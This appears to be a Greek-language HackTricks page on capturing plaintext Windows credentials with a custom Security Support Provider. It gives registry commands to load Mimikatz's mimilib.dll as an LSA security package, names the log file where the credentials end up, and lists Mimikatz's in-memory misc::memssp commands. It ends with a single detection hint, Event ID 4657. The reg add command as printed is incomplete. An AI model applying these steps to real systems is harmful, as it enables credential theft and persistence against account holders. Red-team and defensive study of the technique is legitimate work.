# Custom SSP

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Προσαρμοσμένο SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράψετε** σε **καθαρό κείμενο** τα **διαπιστευτήρια** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.

#### Mimilib

Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
Αποθέστε το dll στο `C:\Windows\System32\`\
Λάβετε μια λίστα υπαρκτών LSA Security Packages:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Προσθέστε το `mimilib.dll` στη λίστα του παρόχου υποστήριξης ασφάλειας (Security Packages):

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

Και μετά από επανεκκίνηση, όλα τα διαπιστευτήρια μπορούν να βρεθούν σε καθαρό κείμενο στο `C:\Windows\System32\kiwissp.log`

#### Στη μνήμη

Μπορείτε επίσης να εισαγάγετε αυτό στη μνήμη απευθείας χρησιμοποιώντας το Mimikatz (προσέξτε ότι μπορεί να είναι λίγο ασταθές/να μην λειτουργεί):

```powershell
privilege::debug
misc::memssp
```

Αυτό δεν θα επιβιώσει μετά την επανεκκίνηση.

#### Αντιμετώπιση

Event ID 4657 - Ελέγχου δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
